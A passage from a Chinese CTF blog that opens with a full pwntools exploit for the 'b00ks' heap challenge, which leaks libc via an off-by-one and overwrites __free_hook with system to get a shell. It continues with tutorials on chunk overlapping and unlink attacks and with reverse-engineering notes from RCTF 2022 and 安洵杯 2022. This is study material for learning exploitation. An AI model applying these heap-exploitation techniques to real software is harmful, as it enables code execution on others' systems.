class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">len_book,bookname,len_description,description</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>,<span class="built_in">str</span>(len_book))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;(Max 32 chars): &#x27;</span>,bookname)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>,<span class="built_in">str</span>(len_description))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,description</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;want to edit: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;book description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, name)	</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#在 0x555555602040处写入32个a，会覆盖第33位，但并没有创建结构体，所以并没有用到off-by-one</span></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#创建结构体，在aaaaa下面的地址，地址是：0x0000557c2a0e9490</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#list1_addr是0x0000557c2a0e9490</span></span><br><span class="line">list2_addr=list1_addr+<span class="number">0x30</span></span><br><span class="line"><span class="comment">#list2_addr指向了list1结构体后的一个结构体，如果再创建一个结构体，它就会指向下一个结构体头，地址是：0x557c2a0e94c0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;list1_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list1_addr))</span><br><span class="line">success(<span class="string">&quot;list2_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list2_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"><span class="comment">#创建list2，这个list2在list1结构体后，其中name和description指向的堆地址是0x00007f7b27812010，与0x557xxx不一样，是因为开辟空间太大，采用了mmap开辟</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(list2_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">change_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">bookname2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;bookname2 &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(bookname2))</span><br><span class="line"><span class="comment">#继续使用off-by-one泄露bookname2（list2）的地址，libc_base（已知） - bookname2就是偏移</span></span><br><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#通过对构造的fake_list进行写，那为什么不直接change(2)进行写呢，因为写这个操作是对结构体中的地址里的内容进行写，而不是直接覆盖结构体中的地址，（此时list1已经被fake代替，而list2还是list2）</span></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#对list2中的description也就是freehook的地址内的东西进行改写，而不是直接覆盖freehook在list2结构的地址</span></span><br><span class="line">change(<span class="number">2</span>, p64(system))</span><br><span class="line"><span class="comment">#free（2）会完成system(’bin_sh‘)操作</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>那这个题的利用思路就很明确了，当输入author时，会触发off-by-one，就是会多写一个字节，然后创建结构体，这个结构体的地址会覆盖掉那个字节，所以我们可以泄露出list1结构体的地址。接下来，我们构建fake_list，fake_list通过覆盖list1的description来写入，当构造完毕，真正的list1已经被fake_list替换，接下来再创建一个结构体2，这个结构体是为了泄露libc_base地址，当拿到system，binsh，freehook地址时，通过对fakelist的description改写（进入0x0000558149b824c8，改写他的值为binsh，freehook值 ），接下来（进入0x00007fb9c96ce010 ，改写他的值为system），free（2）就可以完成攻击shell操作。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="number">558149b82400</span>: <span class="number">0</span>x00000<span class="number">00000000001</span>      <span class="number">0</span>x0000558<span class="number">149b824c8</span> fakelist</span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82410</span>: <span class="number">0</span>x0000558<span class="number">149b824c8</span>      <span class="number">0</span>x00000<span class="number">00000001000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82420</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82430</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82440</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82450</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82460</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82470</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82480</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000031</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82490</span>: <span class="number">0</span>x00000<span class="number">00000000001</span>      <span class="number">0</span>x0000558149b822b0list1</span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824a0</span>: <span class="number">0</span>x0000558<span class="number">149b823a0</span>      <span class="number">0</span>x000000<span class="number">00000000e0</span></span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824b0</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000031</span></span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824c0</span>: <span class="number">0</span>x00000<span class="number">00000000002</span>      <span class="number">0</span>x00007fb9c96f0010list2</span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824d0</span>: <span class="number">0</span>x00007fb9c96ce010      <span class="number">0</span>x00000<span class="number">00000021000</span></span><br></pre></td></tr></table></figure>



<h2 id="chunk-extend-and-overlapping"><a href="#chunk-extend-and-overlapping" class="headerlink" title="chunk extend and overlapping"></a>chunk extend and overlapping</h2><p>chunk extend是对漏洞的常见利用手法，通过extend可以实现chunk overlapping效果，需要程序中存在堆的漏洞并且漏洞可以控制chunk header中的数据</p>
<p>原理：chunk extend能产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">获取chunk块的大小</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">chunksize</span>(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">chunksize_nomask</span>(p) ((p)-&gt;mchunk_size)</span><br><span class="line">获取下一块chunk大小</span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">next_chunk</span>(p) ((mchunkptr)(((char *) (p)) + <span class="built_in">chunksize</span>(p)))</span><br><span class="line">获取前一个chunk信息的操作</span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">prev_size</span>(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">prev_chunk</span>(p) ((mchunkptr)(((char *) (p)) - <span class="built_in">prev_size</span>(p)))</span><br><span class="line">判断chunk是否处于use状态</span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">inuse</span>(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + <span class="built_in">chunksize</span>(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>总而言之，ptmalloc通过chunk header的数据判断chunk的使用核对chunk的前后块定位，那么就可用chunk extend 就是通过控制size和pre_size实现跨块操作，导致overlapping。</p>
<p>具体说明：</p>
<p>1、对inuse的fastbin的extend</p>
<p>创建两个chunk（0x10），修改第一个chunk的size使得size&#x3D;chunk1.size+chunk2.size，这时候free（chunk1），发现chunk1和chunk2合成了一个chunk进行释放，接下来再通过malloc就可以得到chunk1+chunk2，取得chunk2中的内容，这种状态叫做overlapping chunk。</p>
<p>2、对inuse的smallbin的extend</p>
<p>因为处于fastbin范围内的chunk释放后会放入fastbin链表（最大是0x70），不处于这个范围内的chunk会进入unsortedbin，创建一个0x80的chunk和0x10的chunk，将0x80的size改为0xb1，然后free，chunk1和chunk2会吞入unsorted bin，如果malloc（0xa0）就会取出chunk1和chunk2</p>
<p>3、对free的smallbin进行extend</p>
<p>与2一样，但这次先free（chunk1），然后再修改size，chunk1在free后会进入unsortedbin，然后改size，接下来再malloc就可以得到chunk1+chunk2</p>
<p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
<p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd&#x2F;bk 指针从而可以实现 fastbin attack 等利用。</p>
<p>4、通过extend后向overlapping</p>
<p>进行4次malloc（0x10），然后把第一个的size改成0x61，然后free，接下来malloc（0x50），其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<p>5、通过extend向前overlapping</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink其实就是将双向链表中的free块拿出来，运用漏洞时就是修改chunk的内存布局，借助unlink操作修改指针</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230331190125023.png" alt="image-20230331190125023"></p>
<p>程序进行unlink时进行检查操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于&#x27;P&#x27;已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);        </span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line"> <span class="comment">// 检查 largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">    malloc_printerr (check_action,<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>就是指：</p>
<p>chunkP的下一个chunk的上一个chunk是不是chunkP</p>
<p>chunkP的上一个chunk的下一个chunk是不是chunkP‘9</p>
<p>攻击原理：</p>
<p>unlink的检查不是那么完美，只会根据相对地址来检查，他始终会认为chunk_head + 0x8的位置presize</p>
<p>所以可以用来欺骗程序</p>
<p>如何利用？</p>
<p>首先要知道堆创建后，如果free，他仍然会保留在那个位置，数据不会被抹除，只是size的p位被改变，然后要知道如果一个chunk被释放，会检查这个chunk相邻的chunk是否为free状态，如果free则要进行合并（向前和向后合并），合并时需要将空闲chunk从原来bin中unlink，并将合并后的chunk放入unsorted bin中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2022/12/21/2022-RCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/21/2022-RCTF/" class="post-title-link" itemprop="url">2022-RCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-12-21 11:09:45 / 修改时间：17:36:57" itemprop="dateCreated datePublished" datetime="2022-12-21T11:09:45+08:00">2022-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="RCTF"><a href="#RCTF" class="headerlink" title="RCTF"></a>RCTF</h1><p>本次比赛打的很出色，出了3道re和2道misc，而这次也是几乎全是21级在战斗，取得了11名的成绩，和几位逆向大哥一起看到通宵，最后只差两道就ak了逆向。</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221221111548001.png" alt="image-20221221111548001"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="CheckYourKey"><a href="#CheckYourKey" class="headerlink" title="CheckYourKey"></a>CheckYourKey</h3><p>一道安卓题，通过jni动态调用了ooxx函数，主要加密流程是先aes再base58最后base64，数据通过交叉引用可以还原，base64换表了，其他都没变，aes的key是：goodlucksmartman，先解base64再解base58，最后aes得到flag：flag{rtyhgf!@#$}。像这种题：jni里调用了ooxx函数，但本身jni又有加密（与ooxx）里的加密一样，其实真正加密处理是在jni中，对比数据也是，所以只用看jni里的就ok。</p>
<p>首先定位到JNI_ONLOAD，函数中包括这一段</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (unsigned <span class="built_in">int</span>)sub<span class="constructor">_17B34((<span class="params">__int64</span>)</span>vm, (__int64)&amp;v27, <span class="number">0x10006</span>u) )</span><br><span class="line"> &#123;</span><br><span class="line">   v5 = -<span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   v3 = sub<span class="constructor">_17B80(<span class="params">v27</span>, (<span class="params">__int64</span>)</span>byte_41190);</span><br><span class="line">   v46 = sub_8965;</span><br></pre></td></tr></table></figure>

<p>sub_8965函数中是真正加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a3 &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)sub_16254((__int64)x0_0, a3) == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = sub_14F70(x0_0, a3, <span class="number">0LL</span>);</span><br><span class="line">    v9 = (_QWORD *)operator new[](<span class="number">0x10</span>uLL);</span><br><span class="line">    v9[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">    *v9 = <span class="number">0LL</span>;</span><br><span class="line">    aes(v10, (__int64)byte_41140, (__int64)v9);</span><br><span class="line">    v8 = (<span class="type">char</span> *)base58((__int64)v9, <span class="number">0x10</span>uLL);</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(v8);</span><br><span class="line">    s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">2</span> * v7);</span><br><span class="line">    <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">2</span> * v7);</span><br><span class="line">    base64((__int64)v8, v7, (__int64)s1);</span><br><span class="line">    v21 = <span class="built_in">strlen</span>(byte_41088);</span><br><span class="line">    v22 = linux_eabi_syscall(__NR_openat, <span class="number">-100</span>, byte_41094, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="picStore"><a href="#picStore" class="headerlink" title="picStore"></a>picStore</h3><p>这个题跟超人和zzy从早上看到晚上8点多mad，</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/" class="post-title-link" itemprop="url">2022安洵杯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-11-28 21:45:46 / 修改时间：23:31:08" itemprop="dateCreated datePublished" datetime="2022-11-28T21:45:46+08:00">2022-11-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2022安洵杯"><a href="#2022安洵杯" class="headerlink" title="2022安洵杯"></a>2022安洵杯</h1><p>可能是因为看了一晚上球的原因，这天状态相当不好，赛后还是要好好反思和复现</p>
<h2 id="reeee"><a href="#reeee" class="headerlink" title="reeee"></a>reeee</h2><p>这个题就是个rc4，没什么意思</p>
<h2 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h2><p>首先主函数大概是一个加载驱动类的写法，但其实都不重要，重要的是不知道怎么调试，所以当时一直在搜索，其实找到逻辑直接分析就行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall <span class="title function_">sub_4015C0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  SERVICE_STATUS_HANDLE v2; <span class="comment">// eax</span></span><br><span class="line">  _WORD *v3; <span class="comment">// ecx</span></span><br><span class="line">  _WORD *v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">76</span>]; <span class="comment">// [esp+8h] [ebp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = RegisterServiceCtrlHandlerW(<span class="string">L&quot;SvcTest&quot;</span>, HandlerProc);</span><br><span class="line">  hServiceStatus = (<span class="type">int</span>)v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    ServiceStatus.dwCurrentState = <span class="number">4</span>;</span><br><span class="line">    SetServiceStatus(v2, &amp;ServiceStatus);</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        OutputDebugStringW(<span class="string">L&quot;[SvcTest] service is running...&quot;</span>);</span><br><span class="line">        